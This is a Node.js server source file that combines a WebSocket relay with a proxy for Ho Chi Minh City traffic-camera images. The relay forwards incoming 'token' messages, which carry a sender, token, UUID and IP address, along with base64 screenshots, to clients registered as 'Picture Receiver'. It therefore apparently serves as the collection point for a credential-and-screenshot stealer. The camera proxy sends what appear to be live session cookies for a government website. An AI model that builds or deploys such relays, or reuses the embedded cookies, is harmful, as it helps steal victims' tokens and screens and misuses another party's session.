import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

// Serve static files from the root directory
app.use(express.static(__dirname));

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

// WebSocket logic
const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId = null;

wss.on("connection", (ws) => {
    const userID = crypto.randomUUID();  
    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });
    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners(); 
    });
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

const handleMessage = (ws, data, userID) => {
    try {
        const messageData = JSON.parse(data.toString());
        
        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
            broadcastToPictureReceivers(messageData);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        console.error('Error parsing or processing message:', e);
        console.error('Raw message data:', data);
    }
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
};

const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};

// Camera viewer logic
const cameraGroups = [
    {
        name: "Lộ trình chị Thủy",
        cameras: [
            {id: "5d8cdb9f766c880017188968", name: "Camera 1"},
            {id: "58ad69c4bd82540010390be7", name: "Camera 2"},
            {id: "587ee2aeb807da0011e33d52", name: "Camera 3"},
            {id: "587ed91db807da0011e33d4e", name: "Camera 4"},
            {id: "5a606a958576340017d06621", name: "Camera 5"},
            {id: "5d9ddec9766c880017188c9c", name: "Camera 6"}
        ]
    },
    {
        name: "Lộ trình Q4",
        cameras: [
            {id: "6623e9e96f998a001b2525ce", name: "Camera Q4-1"},
            {id: "6623ea416f998a001b25260a", name: "Camera Q4-2"},
            {id: "6623e2e16f998a001b252233", name: "Camera Q4-3"},
            {id: "58b5752e17139d0010f35d5f", name: "Camera Q4-4"},
            {id: "662b85031afb9c00172dd0dc", name: "Camera Q4-5"}
        ]
    }
];

const headers = {
    "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "cookie": "ASP.NET_SessionId=tvjf3gj0t0iedy12xgwkguzd; .VDMS=C371EE8E7B9CE151C954199B928DB4C56705D1882054902ECE5E7A36BDE27417DA815B9BA689F84C491E3113D1E0E81B0A87E2AA97FC6D4E5D4A63AB0B7F950D1E31EB524760AE01D517054B5EA183BC4272C905FF6B7B878D1B59539FC702CAF62C829E4A621DAD897F8C5D127972C658CCA6ED; _frontend=!UzLlJ/oR897uggP3xOTVoJth7yoQDv2Ym071q7PnFZbn10OBAq+wheuefT5wExfVIYu5Umkoj3wREac=; CurrentLanguage=vi; TS01e7700a=0150c7cfd1059167ca144761efe2f8515248fb12fde7e6fb26407dc90ed54d38475c733d0c704e1bf8a11ad686e6f21123a2532bde0a59b13db0c3c81edc173952e969e57a0a0784558c335674f500e89088313f4eaca7cd5144d2014298e2ca807e8a7b86; TSb224dc8e027=08a5ec0864ab2000112687e2e80079498069f823b24db1765e8be71e587b56d2e8d2b5995e42e30508728b9b9111300028f4fc2e4ef4a40786ded0b4172649b82ebffdaad5ca04a07a630ec5275bcfe19705cee743b147badb4a5f0990465ed8; TS3d206961027=08a5ec0864ab20009f47610b3c612079307447f1476bd583d4799756a8685d085bed33f47bb238da083de6bd5f11300033a13894befee3dccadfe6076e46c465cc89234c4ac402459d656987a2b7533be74a91357d377d30ea1c57e676ec0098",
    "Referer": "http://giaothong.hochiminhcity.gov.vn/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
};

async function fetchImage(id) {
    const baseUrl = "http://giaothong.hochiminhcity.gov.vn/render/ImageHandler.ashx";
    const cameraUrl = `${baseUrl}?id=${id}&t=${Date.now()}`;
    try {
        const response = await fetch(cameraUrl, { headers });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return await response.buffer();
    } catch (error) {
        console.error(`Error fetching image for camera ${id}:`, error);
        return null;
    }
}

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/image/:id', async (req, res) => {
    const imageBuffer = await fetchImage(req.params.id);
    if (imageBuffer) {
        res.writeHead(200, { 'Content-Type': 'image/jpeg' });
        res.end(imageBuffer);
    } else {
        res.status(500).send('Error fetching image');
    }
});

app.get('/data', (req, res) => {
    res.json(cameraGroups);
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
